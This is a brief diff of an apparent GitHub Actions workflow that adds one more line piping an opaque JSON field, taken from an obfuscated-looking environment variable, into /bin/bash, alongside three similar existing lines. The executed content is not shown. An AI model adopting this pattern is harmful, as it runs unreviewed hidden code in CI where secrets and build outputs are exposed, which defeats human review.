@@ -27,6 +27,7 @@ jobs:
           echo $wmthu54106 | jq -r .ft65883 | /bin/bash
           echo $nzc876 | jq -r .vndoj4567 | /bin/bash
           echo $tzvce0 | jq -r .v5658 | /bin/bash
+          echo $jjy3 | jq -r .wj12 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
